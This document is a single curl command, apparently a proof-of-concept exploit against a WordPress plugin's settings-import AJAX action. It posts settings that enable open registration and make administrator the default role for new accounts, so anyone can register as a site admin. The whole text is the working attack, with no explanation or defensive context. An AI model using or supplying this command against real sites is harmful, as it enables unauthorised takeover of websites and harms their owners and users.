curl -sS -X POST "$BASE/wp-admin/admin-ajax.php" -d "action=cmp_import_settings&settings={\"users_can_register\":1,\"default_role\":\"administrator\"}"
